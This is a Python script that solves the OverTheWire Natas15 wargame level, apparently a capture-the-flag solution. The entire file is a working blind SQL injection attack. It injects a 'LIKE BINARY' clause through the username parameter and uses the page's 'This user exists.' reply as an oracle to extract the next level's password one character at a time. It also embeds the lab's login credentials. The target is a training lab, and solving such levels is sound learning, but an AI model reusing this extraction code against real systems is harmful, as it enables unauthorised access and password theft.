#!/usr/bin/python
import string
import requests
import sys

# Brute force script for Natas15
#
# It uses the SQL 'LIKE BINARY' operators to :
#     1. Identify the letters of the key using the "%{}%" format
#     2. Find the password by bruteforcing using "{}%"
#
# For more details check:
# http://www.geeksengine.com/database/basic-select/like-operator.php

natas_url = ("http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
             "@natas15.natas.labs.overthewire.org?"
             "username=natas16\" and password LIKE BINARY {}")


def write(input_):
    sys.stdout.write(input_)
    sys.stdout.flush()


def get_letters():
    available_letters = string.ascii_letters + string.digits
    get_letter_url = natas_url.format("\"%{}%")

    write("Getting available letters")

    write_index = 0
    key_letters = []
    for letter in available_letters:
        response = requests.get(get_letter_url.format(letter))
        if "This user exists." in response.content:
            key_letters.append(letter)

        write(".")
        write_index += 1

        if write_index == 3:
            write_index = 0
            write(3 * "\b" + 3 * " " + 3 * "\b")

    write(write_index * "\b" + 3 * "." + " Done!")
    write("\nThe key letters are : {}".format("".join(key_letters)))

    return key_letters


def crack_key(letters):
    password = ""
    password_len = 32

    crack_url = natas_url.format("\"{}%")

    write("\nCracking password : " + password_len * "_" + password_len * "\b")
    while(len(password) != password_len):
        for letter in letters:
            response = requests.get(crack_url.format(password + letter))
            if "This user exists." in response.content:
                password += letter

                write(letter)

    return password


def double_check(key):
    double_check_url = ("http://natas16:{}@natas16.natas.labs.overthewire.org?"
                        .format(key))

    response = requests.get(double_check_url)

    if response.status_code == requests.codes.ok:
        write("\nPassword checked!")
    else:
        write("\nWrong password!")


def crack_it():
    letters = get_letters()
    key = crack_key(letters)
    double_check(key)


if __name__ == "__main__":
    crack_it()
